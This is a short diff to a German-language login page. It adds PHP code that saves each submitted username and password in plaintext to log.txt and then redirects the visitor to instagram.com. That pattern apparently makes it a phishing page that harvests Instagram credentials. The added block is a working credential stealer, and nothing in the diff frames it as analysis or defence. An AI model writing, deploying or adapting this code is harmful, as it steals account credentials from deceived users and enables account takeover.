@@ -56,5 +56,10 @@ header('<!DOCTYPE html>
         <input type="password" name="password" placeholder="Passwort" required><br>
         <button type="submit">Anmelden</button>
     </form>
-</body>
+</body><?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+file_put_contents('log.txt', "Benutzername: $username, Passwort: $password\n", FILE_APPEND);
+header('Location: https://www.instagram.com');
+?>
 </html>
